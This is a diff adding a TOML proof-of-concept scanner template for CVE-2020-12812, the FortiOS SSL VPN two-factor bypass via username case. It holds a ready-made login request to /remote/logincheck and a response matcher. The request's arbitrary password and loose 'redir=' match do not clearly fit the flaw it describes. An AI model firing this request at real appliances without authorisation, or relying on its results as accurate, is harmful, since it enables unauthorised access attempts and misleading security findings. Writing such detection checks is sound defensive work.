@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "检测FortiOS SSL VPN认证绕过漏洞(CVE-2020-12812)，通过修改用户名大小写绕过FortiToken双因素认证，影响FortiOS 6.4.0/6.2.0-6.2.3/6.0.9及以下版本"
+id = "POC-AVE-2020-0400"
+name = "FortiOS SSL VPN Authentication Bypass PoC"
+severity = "critical"
+tags = ["cve-2020-12812"]
+vuln_id = [
+    "CVE-2020-12812",
+    "AVE-2020-0400",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/remote/logincheck"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=Admin&password=anything&realm=&credential="
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["redir="]
